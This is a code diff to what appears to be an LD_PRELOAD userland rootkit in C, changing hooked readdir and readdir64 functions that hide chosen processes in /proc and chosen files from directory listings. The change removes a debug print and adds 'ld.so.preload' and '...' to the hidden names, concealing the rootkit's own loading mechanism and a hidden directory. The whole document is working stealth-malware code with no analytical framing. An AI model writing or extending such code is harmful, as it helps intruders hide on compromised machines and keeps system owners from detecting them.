@@ -99,15 +99,17 @@ struct dirent64* readdir64(DIR* dirp)
         // processes
         if (strcmp(pwd, "/proc") == 0) {
             if (is_hidden(result->d_name)) {
-                printf("HIT pid %s", result->d_name);
                 closedir(proc_1);
                 return temp;
             }
         }
 
         // other directories
-        if (strstr(result->d_name, HIDE_ME) || strcmp(result->d_name, "e.lock") == 0
-            || strcmp(result->d_name, "ssh-s6Y4tDtahIuL") == 0) {
+        if (strstr(result->d_name, HIDE_ME)
+            || strcmp(result->d_name, "e.lock") == 0
+            || strcmp(result->d_name, "ssh-s6Y4tDtahIuL") == 0
+            || strcmp(result->d_name, "ld.so.preload") == 0
+            || strcmp(result->d_name, "...") == 0) {
             closedir(proc_1);
             return temp;
         }
@@ -138,15 +140,17 @@ struct dirent* readdir(DIR* dirp)
         // processes
         if (strcmp(pwd, "/proc") == 0) {
             if (is_hidden(result->d_name)) {
-                printf("HIT pid %s", result->d_name);
                 closedir(proc_1);
                 return temp;
             }
         }
 
         // other directories
-        if (strstr(result->d_name, HIDE_ME) || strcmp(result->d_name, "e.lock") == 0
-            || strcmp(result->d_name, "ssh-s6Y4tDtahIuL") == 0) {
+        if (strstr(result->d_name, HIDE_ME)
+            || strcmp(result->d_name, "e.lock") == 0
+            || strcmp(result->d_name, "ssh-s6Y4tDtahIuL") == 0
+            || strcmp(result->d_name, "ld.so.preload") == 0
+            || strcmp(result->d_name, "...") == 0) {
             closedir(proc_1);
             return temp;
         }
